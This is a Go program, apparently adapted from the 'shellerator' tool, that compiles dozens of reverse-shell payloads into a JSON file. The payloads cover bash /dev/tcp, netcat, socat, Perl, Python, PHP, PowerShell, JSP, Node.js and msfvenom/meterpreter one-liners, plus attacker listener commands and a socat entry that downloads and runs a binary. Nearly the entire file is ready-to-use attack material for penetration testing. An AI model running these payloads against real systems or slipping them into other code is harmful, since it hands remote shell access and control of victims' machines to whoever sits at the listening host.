package main

//Credits: https://github.com/ShutdownRepo/shellerator/blob/master/shellerator.py

import (
	"encoding/json"
	"fmt"
	"os"
)

type revshell struct {
	Type    string `json:"type"`
	Note    string `json:"note"`
	Payload string `json:"payload"`
}

func main() {
	// an instance of our Book struct
	listPayload := []revshell{}
	listPayload = append(listPayload, revshell{Type: "php", Payload: "test"})
	listPayload = append(listPayload, revshell{Type: "bash", Payload: `/bin/bash -c '/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' `})
	listPayload = append(listPayload, revshell{Type: "bash", Payload: `/bin/bash -c '/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<&1 2>&1' `})
	listPayload = append(listPayload, revshell{Type: "bash", Payload: `/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<& 2>&1`})
	listPayload = append(listPayload, revshell{Type: "bash", Payload: `bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`})
	listPayload = append(listPayload, revshell{Type: "bash", Payload: `exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done`})
	listPayload = append(listPayload, revshell{Type: "bash", Payload: `exec /bin/sh 0</dev/tcp/{LHOST}/{LPORT} 1>&0 2>&0`})
	listPayload = append(listPayload, revshell{Type: "bash", Payload: `0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196`})
	listPayload = append(listPayload, revshell{Type: "bash", Note: "UDP", Payload: `bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1`})
	listPayload = append(listPayload, revshell{Type: "bash", Note: "UDP Listener (attacker)", Payload: `nc -u -lvp {LPORT}`})
	listPayload = append(listPayload, revshell{Type: "netcat", Payload: `nc -e /bin/sh {LHOST} {LPORT}`})
	listPayload = append(listPayload, revshell{Type: "netcat", Payload: `nc -e /bin/bash {LHOST} {LPORT}`})
	listPayload = append(listPayload, revshell{Type: "netcat", Payload: `nc -c bash {LHOST} {LPORT}`})
	listPayload = append(listPayload, revshell{Type: "netcat", Payload: `mknod backpipe p && nc {LHOST} {LPORT} 0<backpipe | /bin/bash 1>backpipe `})
	listPayload = append(listPayload, revshell{Type: "netcat", Payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f`})
	listPayload = append(listPayload, revshell{Type: "netcat", Payload: `rm -f /tmp/p; mknod /tmp/p p && nc {LHOST} {LPORT} 0/tmp/p 2>&1`})
	listPayload = append(listPayload, revshell{Type: "netcat", Payload: `rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} > f`})
	listPayload = append(listPayload, revshell{Type: "netcat", Payload: `rm -f x; mknod x p && nc {LHOST} {LPORT} 0<x | /bin/bash 1>x`})
	listPayload = append(listPayload, revshell{Type: "ncat", Payload: `ncat {LHOST} {LPORT} -e /bin/bash`})
	listPayload = append(listPayload, revshell{Type: "ncat", Payload: `ncat --udp {LHOST} {LPORT} -e /bin/bash`})
	listPayload = append(listPayload, revshell{Type: "telnet", Payload: `rm -f /tmp/p; mknod /tmp/p p && telnet {LHOST} {LPORT} 0/tmp/p 2>&1`})
	listPayload = append(listPayload, revshell{Type: "telnet", Payload: `telnet {LHOST} {LPORT} | /bin/bash | telnet {LHOST} 667`})
	listPayload = append(listPayload, revshell{Type: "telnet", Payload: `rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet {LHOST} {LPORT} > f`})
	listPayload = append(listPayload, revshell{Type: "telnet", Payload: `rm -f x; mknod x p && telnet {LHOST} {LPORT} 0<x | /bin/bash 1>x`})
	listPayload = append(listPayload, revshell{Type: "socat", Payload: `/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}`})
	listPayload = append(listPayload, revshell{Type: "socat", Payload: `socat tcp-connect:{LHOST}:{LPORT} exec:"bash -li",pty,stderr,setsid,sigint,sane`})
	listPayload = append(listPayload, revshell{Type: "socat", Payload: `wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}`})
	listPayload = append(listPayload, revshell{Type: "socat", Note: "Listener (attacker)", Payload: "socat file:`tty`,raw,echo=0 TCP-L:{LPORT}"})
	listPayload = append(listPayload, revshell{Type: "perl", Payload: `perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' `})
	listPayload = append(listPayload, revshell{Type: "perl", Payload: `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' `})
	listPayload = append(listPayload, revshell{Type: "perl", Note: "Windows", Payload: `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' `})
	listPayload = append(listPayload, revshell{Type: "python", Payload: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' `})
	listPayload = append(listPayload, revshell{Type: "python", Payload: `export RHOST="{LHOST}";export RPORT={LPORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' `})
	listPayload = append(listPayload, revshell{Type: "python", Payload: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' `})
	listPayload = append(listPayload, revshell{Type: "python", Note: "Windows", Payload: `C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{LHOST}', {LPORT})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"`})
	listPayload = append(listPayload, revshell{Type: "php", Payload: `php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");' \`})
	listPayload = append(listPayload, revshell{Type: "php", Payload: `php -r '$s=fsockopen("{LHOST}",{LPORT});$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);' `})
	listPayload = append(listPayload, revshell{Type: "php", Payload: `php -r '$s=fsockopen("{LHOST}",{LPORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");' `})
	listPayload = append(listPayload, revshell{Type: "php", Payload: `php -r '$s=fsockopen("{LHOST}",{LPORT});"/bin/sh -i <&3 >&3 2>&3";' `})
	listPayload = append(listPayload, revshell{Type: "php", Payload: `php -r '$s=fsockopen("{LHOST}",{LPORT});system("/bin/sh -i <&3 >&3 2>&3");' `})
	listPayload = append(listPayload, revshell{Type: "php", Payload: `php -r '$s=fsockopen("{LHOST}",{LPORT});popen("/bin/sh -i <&3 >&3 2>&3", "r");' `})
	listPayload = append(listPayload, revshell{Type: "php", Payload: `php -r '$s=\'127.0.0.1\';$p=443;@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\'/bin/sh$IFS-i\',array(array(\'pipe\',\'r\'),array(\'pipe\',\'w\'),array(\'pipe\',\'w\')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\'connection/closed\');if(feof($p[1]))die(\'shell/not/response\');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die("proc_open/disabled");}}else{die("not/connect");}' `})
	listPayload = append(listPayload, revshell{Type: "ruby", Payload: `ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' `})
	listPayload = append(listPayload, revshell{Type: "ruby", Payload: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' `})
	listPayload = append(listPayload, revshell{Type: "ruby", Note: "Windows", Payload: `ruby -rsocket -e 'c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' `})
	listPayload = append(listPayload, revshell{Type: "openssl", Payload: `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s`})
	listPayload = append(listPayload, revshell{Type: "openssl", Note: "Listener (attacker)", Payload: `ncat --ssl -vv -l -p {LPORT}`})
	listPayload = append(listPayload, revshell{Type: "powershell", Payload: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`})
	listPayload = append(listPayload, revshell{Type: "powershell", Payload: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`})
	listPayload = append(listPayload, revshell{Type: "awk", Payload: `awk 'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`})
	listPayload = append(listPayload, revshell{Type: "tclsh", Payload: `echo 'set s [socket {LHOST} {LPORT}];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh`})
	listPayload = append(listPayload, revshell{Type: "java", Payload: `r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()`})
	listPayload = append(listPayload, revshell{Type: "java", Payload: `String host="{LPORT}";
int port={LPORT};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`})
	listPayload = append(listPayload, revshell{Type: "java", Note: "More stealthy", Payload: `Thread thread = new Thread(){public void run(){        //Reverse shell here        }}thread.start();`})
	listPayload = append(listPayload, revshell{Type: "jsp", Payload: `<%@page import="java.lang.*"%>;<%@page import="java.io.*"%>;<%@page import="java.net.*"%>;<%@page import="java.util.*"%>;<%String shellPath = null;try{if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {shellPath = new String("/bin/sh");}else{shellPath = new String("cmd.exe");}} catch( Exception e ){} class StreamConnector extends Thread{InputStream wz;OutputStream yr;StreamConnector( InputStream wz, OutputStream yr ) {this.wz = wz;this.yr = yr;} public void run(){BufferedReader r  = null;BufferedWriter w = null;try{r  = new BufferedReader(new InputStreamReader(wz));w = new BufferedWriter(new OutputStreamWriter(yr));char buffer[] = new char[8192];int length;while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 ){w.write( buffer, 0, length );w.flush();}} catch( Exception e ){}try{if( r != null ){r.close();}if( w != null ){w.close();}}catch( Exception e ){}}}try {Socket socket = new Socket( "{LHOST}", {LPORT} );Process process = Runtime.getRuntime().exec( shellPath );new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();} catch( Exception e ) {}%>`})
	listPayload = append(listPayload, revshell{Type: "war", Payload: `msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file`})
	listPayload = append(listPayload, revshell{Type: "lua", Note: "Linux", Payload: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`})
	listPayload = append(listPayload, revshell{Type: "lua", Note: "Windows", Payload: `lua5.1 -e 'local host, port = "{LHOST}", {LPORT} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' `})
	listPayload = append(listPayload, revshell{Type: "nodejs", Payload: `require('child_process').exec('nc -e /bin/sh {LHOST} {LPORT}')`})
	listPayload = append(listPayload, revshell{Type: "nodejs", Payload: `-var x = global.process.mainModule.require
-x('child_process').exec('nc {LHOST} {LPORT} -e /bin/bash')`})
	listPayload = append(listPayload, revshell{Type: "nodejs", Payload: `(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({LPORT}, "{LHOST}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();`})
	listPayload = append(listPayload, revshell{Type: "groovy", Payload: `String host="{LHOST}";
int port={LPORT};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`})
	listPayload = append(listPayload, revshell{Type: "groovy", Note: "More stealthy", Payload: `Thread.start {        // Reverse shell here        }`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Payload: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f elf > shell.elf`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f exe > shell.exe`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Payload: `msfvenom -p osx/x86/shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f macho > shell.macho`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f asp > shell.asp`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Payload: `msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.jsp`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Payload: `msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f war > shell.war`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Payload: `msfvenom -p cmd/unix/reverse_python LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.py`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Payload: `msfvenom -p cmd/unix/reverse_bash LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.sh`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Payload: `msfvenom -p cmd/unix/reverse_perl LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.pl`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Note: "Windows Staged reverse TCP", Payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Note: "Windows Stageless reverse TCP", Payload: `msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Note: "Linux Staged reverse TCP", Payload: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf`})
	listPayload = append(listPayload, revshell{Type: "meterpreter", Note: "Linux Stageless reverse TCP", Payload: `msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf`})

	byteArray, err := json.MarshalIndent(listPayload, "", " ")
	if err != nil {
		fmt.Println(err)
	}
	jsonFile, err := os.Create("./data.json")
	jsonFile.Write(byteArray)
	fmt.Println(string(byteArray))
}
